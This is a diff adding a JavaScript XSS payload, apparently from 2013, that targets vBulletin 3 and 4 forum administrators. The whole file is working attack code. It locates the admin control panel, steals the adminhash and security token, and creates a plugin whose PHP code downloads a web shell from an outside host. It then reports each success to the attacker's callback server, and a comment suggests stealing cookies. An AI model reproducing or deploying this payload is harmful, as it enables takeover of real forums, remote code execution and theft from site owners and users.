@@ -1,0 +1,141 @@
+/*
+# vBulletin 3 and 4 XSS Payload
+# This payload will allow you to exploit an XSS vulnerability and create a plugin.
+#
+# Requirements:
+# XSS Vulnerability
+# Administrator must be logged into admin panel when you get them to execute the payload
+#
+# Usage:
+# Start the payload with the start_payload function
+# There are three parameters: url, search, and acpname
+# url is obviously the full path to the forum (with trailing slash!)
+# search is whether you want to search for the admincp name (boolean)
+# acpname is if you already know the admincp name you can specify it here (just the name no slashes)
+# start_payload will return false if no admincp directory is found when search is true
+# Once the admincp name is either found or provided by the user the create_plugin function will be called
+# You can edit the variables in that function to your liking
+# I have a simple callback function here as an example to tell me when a plugin has been created. 
+#
+# Example:
+# <script src='http://linktoexternalhost.com/payload.js'></script><script>start_payload("http://localhost/forum/", true, null);</script>
+#
+# @PlumLulz
+# plumm@jabber.org
+# 2013
+#
+# Silent but deadly
+*/
+
+
+// Lets create the jQuery source
+var jq = document.createElement('script');
+jq.src = "//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js";
+document.getElementsByTagName('head')[0].appendChild(jq);
+
+// Callback function
+// All this does is send a message to my server when something happens. Where it saves it to a log file for later viewing.
+function callback(message) {
+	var url = 'http://lol.net/cb.php?cb='+message;
+	$.get(url, function (response) {
+		// Callback response
+	});
+}
+
+// Start payload function
+function start_payload(url, search, acpname) {
+	if(search == true) {
+		// Lets try and get the admincp directory
+		$.get(url+"index.php", function(response) {
+			// Check the footer links to see if admin exists
+			// If it does steal the value
+			// The footer class is different in vB3 so we must check for both
+			if($(response).find('.footer_links').length) {
+				// vB4 footer found
+				// Look at each footer link for Admin
+				$('.footer_links li', response).each(function() {
+					// Admincp link found
+					if($($(this).html()).html() == 'Admin') {
+						var admincpdir = $($(this).html()).attr('href').replace('index.php'  , '');
+						create_plugin(url, admincpdir);
+						return true;
+					}
+				});
+			} else if($(response).find('.tfoot')) {
+				// vB3 footer found
+				// Look at each footer link for Admin
+				$('.tfoot a', response).each(function() {
+					if($(this).html() == 'Admin') {
+						var admincpdir = $(this).attr('href').replace('index.php', '');
+						create_plugin(url, admincpdir);
+						alert(admincpdir);
+						return true;
+					}
+				});
+			}
+			if(!admincpdir) {
+				return false;
+			}
+		});
+	} else {
+		var admincpdir = acpname+"/";
+		create_plugin(url, admincpdir);
+		return true;
+	}
+}
+
+// Create plugin function
+function create_plugin(url, admincpdir) {
+	// Plugin information
+	var product = 'vbulletin';
+	var hookname = 'ajax_start';
+	var title = 'Pwned By XSS';
+	var executionorder = '5';
+	var phpcode = "if(isset($_GET['pwned'])) {if(file_put_contents('pwned.php', file_get_contents('http://lol.net/shell2.txt'))) { echo 'pwned'; } }";
+	var active = '1'; // boolean
+	
+	// Lets fetch the adminhash and securitytoken for the POST request
+	$.get(url+admincpdir+"plugin.php?do=add", function(response) {
+		var adminhash = $(response).find('input[name="adminhash"]').val();
+		var securitytoken = $(response).find('input[name="securitytoken"]').val();
+		
+		// Lets make the POST request and create the plugin
+		$.ajax({
+			type: "POST",
+			url: url+admincpdir+"plugin.php?do=update",
+			dataType: 'text',
+			data: {
+				do:"update",
+				adminhash:adminhash,
+				securitytoken:securitytoken,
+				product:product,
+				hookname:hookname,
+				title:title,
+				executionorder:executionorder,
+				phpcode:phpcode,
+				active:active,
+				pluginid:""
+			},
+			error: function (request, textStatus, errorThrown) {
+				// We must catch the response error for vB4 versions
+				if(request.responseText.search('Saved Plugin Successfully') != -1) {
+					// Plugin created
+					// Put a callback here so you know when your plugin has been created
+					// I like to send a text or email to myself 
+					callback("Plugin created on "+url+" hookname: "+hookname+" phpcode "+phpcode);
+				} 
+			}
+		}).done(function(result) {
+			if(result.search('Saved Plugin Successfully') != -1) {
+				// Plugin created
+				// Put a callback here so you know when your plugin has been created
+				// I like to send a text or email to myself 
+				callback("Plugin created on "+url+" hookname: "+hookname+" phpcode "+phpcode);
+			} else {
+				// User is not logged in
+				// You can steal their cookies or try something else at this point
+				callback("Failed to create plugin on "+url);
+			}
+		});
+	}); 
+}
